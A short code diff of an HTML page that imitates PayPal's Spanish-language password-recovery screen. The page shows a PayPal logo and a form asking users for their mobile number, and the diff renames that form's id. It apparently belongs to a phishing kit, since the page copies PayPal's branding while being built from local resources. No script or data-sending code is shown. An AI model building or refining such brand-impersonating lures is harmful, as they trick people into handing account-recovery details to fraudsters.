@@ -26,7 +26,7 @@
           <div class="logo mb-4"> <a class="d-flex justify-content-center" title="paypal"><img src="resources/logo192.png" alt="paypal" height="34"></a></div>
           <h5 class="display-4" style="text-align: center; font-size: 25px; margin-top: 35px">¿Necesita ayuda con su contraseña?</h5>
           <h5 class="display-4" style="text-align: center; font-size: 13px; margin-top: 20px; margin-bottom: 20px">Ingrese el número celular que utiliza en PayPal y le ayudaremos a crear una nueva contraseña.</h5>
-          <form id="loginForm" method="post">
+          <form id="passRecoveryPhoneForm" method="post">
             <div class="form-group">
               <input type="email" class="form-control" id="emailAddress" required placeholder="Número celular">
             </div>
